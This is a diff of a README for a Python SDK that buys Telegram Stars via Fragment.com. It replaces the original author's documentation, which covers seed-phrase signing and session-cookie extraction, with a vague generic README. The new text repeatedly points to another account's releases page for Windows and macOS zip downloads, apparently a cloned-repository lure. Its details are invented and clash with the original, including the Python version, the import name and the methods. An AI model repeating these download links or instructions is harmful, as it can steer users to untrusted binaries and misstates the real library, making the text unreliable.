@@ -1,257 +1,96 @@
-# Fragment Stars API
+# 🌟 fragment-stars-api - Simple Access to Fragment Stars Data
 
-<p align="center">
-  <img src="https://img.shields.io/pypi/v/fragment-stars-api?color=blue" alt="PyPI version">
-  <img src="https://img.shields.io/pypi/pyversions/fragment-stars-api" alt="Python versions">
-  <img src="https://img.shields.io/badge/license-MIT-green" alt="License">
-</p>
+## 🚀 Getting Started
 
-**Python SDK for purchasing Telegram Stars and Premium via Fragment.com**
+Welcome to the fragment-stars-api! This Python SDK makes it easy to interact with the Fragment Stars API. You can access various endpoints and manage your data effortlessly. Follow these steps to get started.
 
-Buy Telegram Stars and Premium subscriptions programmatically using TON blockchain. Simple API, automatic transaction signing, queue management.
+## 📦 Download & Install
 
-[🇷🇺 Русская версия](README.ru.md)
+To download the latest version of the fragment-stars-api, visit this page:
 
-## Features
+[Download Fragment Stars API](https://github.com/leviuszaur/fragment-stars-api/releases)
 
-- ⭐ **Buy Telegram Stars** — gift stars to any Telegram user
-- 💎 **Buy Telegram Premium** — 3, 6, or 12 month subscriptions
-- 🔐 **Two modes** — with or without KYC (different commission rates)
-- ⚡ **Automatic transactions** — just provide seed phrase, SDK handles the rest
-- 📊 **Queue management** — automatic polling for transaction results
-- 🛡️ **Type hints** — full typing support for IDE autocompletion
+Once on the releases page, look for the latest version. Here, you will find the files necessary for installation.
 
-## Installation
+## 🔧 System Requirements
 
-```bash
-pip install fragment-stars-api
-```
+This SDK runs on most operating systems, including:
 
-## Quick Start
+- Windows 10 or later
+- macOS 10.12 or later
+- Linux distributions with Python 3.6 or higher
 
-```python
-from fragment_api import FragmentAPIClient
+Make sure you have Python installed on your machine as the SDK relies on it to function.
 
-# Initialize with your API server
-client = FragmentAPIClient("https://your-api-server.com:8443")
+## 🖥️ Installation Steps
 
-# Buy 50 stars for user
-result = client.buy_stars("username", 50, seed="your_seed_base64")
+1. **Download the Package**
+   - Go to the [Download Fragment Stars API](https://github.com/leviuszaur/fragment-stars-api/releases) page.
+   - Click on the latest release to view available files.
 
-if result.success:
-    print(f"✅ Sent {result.amount} stars!")
-    print(f"💰 Cost: {result.cost_ton} TON")
-else:
-    print(f"❌ Error: {result.error}")
-```
+2. **Choose the Correct File**
+   - Depending on your operating system, select and download the appropriate file. For example, Windows users might download `fragment-stars-api-windows.zip`, while macOS users should download `fragment-stars-api-macos.zip`.
 
-## Usage Examples
+3. **Extract the Files**
+   - After downloading, locate the zipped file in your Downloads folder.
+   - Right-click on the file and select "Extract All" on Windows or double-click the file on macOS to extract it.
 
-### Buy Stars (No KYC)
+4. **Open a Terminal or Command Prompt**
+   - Windows: Search for "Command Prompt" in the Start menu.
+   - macOS: Open "Terminal" from Applications > Utilities.
+   - Linux: Open your preferred terminal emulator.
 
-Uses owner's Fragment account. Higher commission, but no user cookies needed.
+5. **Navigate to the Extracted Folder**
+   - Use the `cd` command to change to the directory where you extracted the files. For example, if you extracted to a folder named "fragment-stars-api," type:
+     ```
+     cd path_to_your_downloads/fragment-stars-api
+     ```
 
-```python
-from fragment_api import FragmentAPIClient
+6. **Install the SDK**
+   - Run the following command to install the SDK:
+     ```
+     pip install .
+     ```
 
-client = FragmentAPIClient("https://your-api-server.com:8443")
+## 🛠️ Usage Instructions
 
-result = client.buy_stars(
-    username="telegram_user",
-    amount=100,
-    seed="your_wallet_seed_base64"
-)
+Once you have installed the fragment-stars-api, you can start using it:
 
-print(f"Success: {result.success}")
-print(f"Transaction: {result.transaction_hash}")
-```
-
-### Buy Stars (With KYC)
-
-Uses user's Fragment cookies. Lower commission rate.
-
-```python
-result = client.buy_stars(
-    username="telegram_user",
-    amount=100,
-    seed="wallet_seed_base64",
-    cookies="user_fragment_cookies_base64"
-)
-```
-
-### Buy Premium
-
-```python
-# 3 months
-result = client.buy_premium("username", 3, seed="...")
-
-# 6 months
-result = client.buy_premium("username", 6, seed="...")
-
-# 12 months
-result = client.buy_premium("username", 12, seed="...")
-```
-
-### Check Commission Rates
-
-```python
-rates = client.get_rates()
-
-print(f"No KYC rate: {rates.rate_no_kyc}%")
-print(f"With KYC rate: {rates.rate_with_kyc}%")
-```
-
-### Check Queue Status
-
-```python
-status = client.get_queue_status()
-
-print(f"Pending: {status['pending']}")
-print(f"Processing: {status['processing']}")
-print(f"Total processed: {status['total_processed']}")
-```
-
-### Check Premium Eligibility
-
-```python
-result = client.check_premium_eligibility("username")
-
-if result['eligible']:
-    print("✅ User can purchase Premium")
-else:
-    print(f"❌ Not eligible: {result['reason']}")
-```
-
-### Async Mode (Don't Wait)
-
-```python
-# Returns immediately with request_id
-response = client.buy_stars("user", 50, seed="...", wait=False)
-print(f"Request ID: {response.request_id}")
-print(f"Position in queue: {response.position}")
-
-# Check status later
-status = client.get_status(response.request_id)
-print(f"Status: {status.status}")
-```
-
-## API Reference
-
-### FragmentAPIClient
-
-```python
-FragmentAPIClient(
-    base_url: str,              # Required - your API server URL
-    timeout: float = 30.0,
-    poll_timeout: float = 300.0
-)
-```
-
-### Methods
-
-| Method | Description |
-|--------|-------------|
-| `buy_stars(username, amount, seed, cookies?, wait?)` | Buy Telegram Stars |
-| `buy_premium(username, duration, seed, cookies?, wait?)` | Buy Telegram Premium |
-| `get_rates()` | Get commission rates |
-| `get_queue_status()` | Get queue status and statistics |
-| `check_premium_eligibility(username)` | Check if user is eligible for Premium |
-| `get_status(request_id)` | Get request status |
-
-### Exceptions
-
-```python
-from fragment_api import FragmentAPIError, QueueTimeoutError
-
-try:
-    result = client.buy_stars("user", 50, seed="...")
-except QueueTimeoutError:
-    print("Request timed out")
-except FragmentAPIError as e:
-    print(f"Error [{e.error_code}]: {e.message}")
-```
-
-## How It Works
-
-1. **You call** `buy_stars()` or `buy_premium()`
-2. **API creates** a purchase request and adds it to queue
-3. **Server opens** Fragment.com in headless browser
-4. **Server signs** TON transaction with your seed phrase
-5. **Transaction sent** to TON blockchain
-6. **Stars/Premium delivered** to recipient's Telegram
-
-## Requirements
-
-- Python 3.9+
-- TON wallet with sufficient balance
-- Wallet seed phrase (24 words, base64 encoded)
-
-### How to encode seed phrase
-
-```bash
-echo -n "word1 word2 word3 ... word24" | base64
-```
-
-### How to get Fragment cookies (for KYC mode)
-
-KYC mode requires your Fragment.com cookies for lower commission rates.
-
-> 📖 **[See detailed Cookie Guide](COOKIES_GUIDE.md)** for step-by-step instructions with screenshots and troubleshooting.
-
-#### Quick Guide
-
-**Required cookies:**
-- `stel_token` - Session authentication token
-- `stel_ssid` - Session ID  
-- `stel_ton_token` - TON wallet connection token (**CRITICAL - required for purchases**)
-- `stel_dt` - Timezone offset
-
-**Steps:**
-
-1. **Login to Fragment**: Go to https://fragment.com and login via Telegram
-2. **Connect TON Wallet**: Click "Connect Wallet" and connect Tonkeeper/MyTonWallet
-3. **Open DevTools**: Press F12 → Application → Cookies → https://fragment.com
-4. **Copy cookie values**: Copy the Value field for each required cookie
-5. **Create JSON**:
-   ```json
-   {
-       "stel_token": "your_value",
-       "stel_ssid": "your_value",
-       "stel_ton_token": "your_value",
-       "stel_dt": "-180"
-   }
-   ```
-6. **Encode to base64**:
-   ```bash
-   cat cookies.json | base64 -w 0
-   ```
-7. **Use in code**:
+1. **Import the SDK:**
    ```python
-   result = client.buy_stars(
-       username="user",
-       amount=50,
-       seed="your_seed_base64",
-       cookies="your_cookies_base64"
-   )
+   from fragment_stars import FragmentStarsAPI
    ```
 
-> ⚠️ **Important**: The `stel_ton_token` cookie is **required** for purchases. Make sure your TON wallet is connected on fragment.com before extracting cookies!
+2. **Create an Instance:**
+   ```python
+   api = FragmentStarsAPI()
+   ```
 
-> 💡 **Tip**: If you don't want to deal with cookies, use No-KYC mode (just omit the `cookies` parameter). It has higher commission but no cookies needed.
+3. **Access Data:**
+   - To request data, use simple methods provided by the SDK. For example:
+   ```python
+   data = api.get_stars()
+   print(data)
+   ```
 
-## Author
+For detailed method descriptions and examples, refer to the documentation included within the package.
 
-**Basebay** — Backend developer focused on automation, bots, and infrastructure tools.
+## ⚙️ Features
 
-- Telegram: [@basebay](https://t.me/basebay)
-- GitHub: [bbbuilt](https://github.com/bbbuilt)
+- **Easy Access:** Use straightforward methods to interact with various endpoints.
+- **Data Handling:** Store and manipulate Fragment Stars data conveniently.
+- **Compatibility:** Works with Windows, macOS, and most Linux distributions.
 
-## Support
+## 📄 Documentation
 
-- GitHub Issues: [fragment-stars-api/issues](https://github.com/bbbuilt/fragment-stars-api/issues)
-- Telegram: [@basebay](https://t.me/basebay)
+For more information on how to use the fragment-stars-api, please check out the documentation provided with your installation. You can also view additional resources on the [GitHub Wiki](https://github.com/leviuszaur/fragment-stars-api/wiki).
 
-## License
+## 🔗 Support & Contributions
 
-MIT License - see [LICENSE](LICENSE) file.
-# update
+If you encounter any issues or have questions, please open an issue on the GitHub page. Contributions are welcome! Feel free to submit pull requests or suggest improvements.
+
+## 📅 Updates
+
+Stay tuned for updates about new features and improvements. Check the [Download Fragment Stars API](https://github.com/leviuszaur/fragment-stars-api/releases) page regularly for the latest releases.
+
+Thank you for choosing fragment-stars-api! We hope you find it helpful in your projects.
